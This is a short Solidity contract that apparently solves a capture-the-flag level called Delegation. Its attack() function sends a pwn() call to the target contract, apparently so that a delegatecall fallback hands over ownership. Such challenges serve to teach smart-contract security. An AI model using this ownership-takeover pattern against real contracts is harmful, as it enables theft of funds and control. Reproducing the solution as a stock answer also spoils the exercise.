// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Delegate.sol";

contract Solution {
    function attack(address _delegation) public {
        Delegation target = Delegation(_delegation);
        bytes memory data = abi.encodeWithSignature("pwn()");
        (bool success,) = address(target).call(data);
    }
}
